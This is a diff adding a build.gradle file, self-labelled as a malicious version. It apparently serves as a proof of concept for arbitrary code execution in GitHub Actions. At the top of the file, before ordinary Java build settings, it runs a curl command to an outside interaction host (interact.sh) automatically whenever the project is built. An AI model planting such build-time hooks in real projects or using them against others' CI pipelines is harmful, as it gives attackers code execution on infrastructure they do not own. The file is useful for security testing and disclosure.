@@ -1,0 +1,21 @@
+// build.gradle - malicious version
+println "hb-test-gradle: Proof of arbitrary code execution in GitHub Actions"
+def proc = "curl -s -o /dev/null https://interact.sh/hb-test-gradle".execute()
+proc.waitFor()
+
+// Normal build logic
+plugins {
+    id 'java'
+}
+
+repositories {
+    mavenCentral()
+}
+
+dependencies {
+    // dependencies
+}
+
+tasks.named('test') {
+    useJUnitPlatform()
+}
